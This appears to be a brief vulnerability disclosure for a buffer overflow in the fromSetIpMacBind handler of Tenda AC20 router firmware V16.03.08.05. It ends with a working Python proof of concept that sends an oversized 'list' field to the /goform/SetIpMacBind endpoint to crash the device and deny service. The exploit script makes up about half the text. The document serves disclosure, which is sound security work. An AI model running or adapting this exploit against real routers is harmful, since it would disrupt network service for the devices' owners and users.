A buffer overflow vulnerability exists in Tenda AC20 V16.03.08.05, which is caused by the fromSetIpMacBind function not checking the length of the input data, which can be exploited by an attacker to launch a denial of service attack.

<img width="415" height="415" alt="image" src="https://github.com/user-attachments/assets/8a273570-206c-495b-bcc7-1d1a57e0b771" />



POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetIpMacBind"

cookie = {"Cookie":"password=12345"}
data = {"list": payload, "bindnum": "1"}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
